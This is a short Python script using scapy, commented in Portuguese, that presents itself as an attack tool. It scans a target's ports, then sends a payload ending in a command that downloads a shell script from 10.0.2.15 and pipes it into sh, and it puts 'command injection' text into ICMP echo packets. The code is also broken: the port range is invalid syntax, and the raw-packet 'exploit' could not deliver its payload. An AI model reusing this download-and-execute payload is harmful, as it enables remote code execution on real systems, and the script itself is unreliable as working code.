#!/usr/bin/env python3

from scapy.all import *
import sys
import subprocess
def reconhecer_portas_e_servicos(alvo):
    """
    Essa função escaneia as 100 portas mais comuns do alvo e identifica os serviços em execução nelas.
    """
    portas_abertas = sr1(IP(dst=alvo)/TCP(dport=(1:100)), timeout=1, verbose=0)
    if portas_abertas:
        print(f"[+] Portas abertas no {alvo}:")
        for b in portas_abertas.summary():
            if b.startswith("|"):
                service = b.split(" ")[1].split("/")[0]
                print(f"Porta {b.split(':')[1]}: {service}")

def explorar_servico_vulneravel(alvo, porta, comando_exploracao):
    """
    Essa função se conecta ao serviço vulnerável em alvo e porta especificados e executa o comando de exploração.
    """
    request = IP(dst=alvo)/TCP(sport=RandShort(), dport=porta)/("A" * 100 + comando_exploracao)
    response = sr1(request, timeout=3, verbose=0)
    if response:
        print(f"[+] Explorou serviço vulnerável em {alvo}:{porta}")

def injecao_comando_icmp(alvo, comando):
    """
    Essa função envia um pedido de eco ICMP para o alvo com o comando especificado como campo de dados.
    """
    request = IP(dst=alvo)/ICMP()/"Injeção de comando: " + comando
    send(request)
    print(f"[+] Enviou pedido de eco ICMP com injeção de comando para {alvo}")

def sniffar_pedidos_echo_icmp(filtro_expr):
    """
    Essa função sniffa pacotes de pedidos de eco ICMP que correspondem ao filtro expressão.
    """
    pacotes = sniff(filter=filtro_expr, prn=lambda x: x.summary(), store=0)
    if pacotes:
        print("[+] Capturou pacotes de pedidos de eco ICMP:")
        for pacote in pacotes:
            print(pacote.summary())

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Uso: sudo python3 scapy_tool.py <ip_alvo> <comando_a_ser_ injetado>")
        sys.exit(1)

    alvo = sys.argv[1]
    comando = sys.argv[2]

    reconhecer_portas_e_servicos(alvo)

    # Neste exemplo, supomos que a porta 80 seja vulnerável e possa ser explorada com o seguinte comando.
    comando_exploracao = "&& curl http://10.0.2.15/shell.sh | sh"
    explorar_servico_vulneravel(alvo, 80, comando_exploracao)

    injecao_comando_icmp(alvo, comando)

    # Sniffar pedidos de eco ICMP enviados do alvo e respostas ICMP enviadas do Kali.
    sniffar_pedidos_echo_icmp("icmp and src " + alvo + " and (icmp or ip and src 10.0.2.15)")
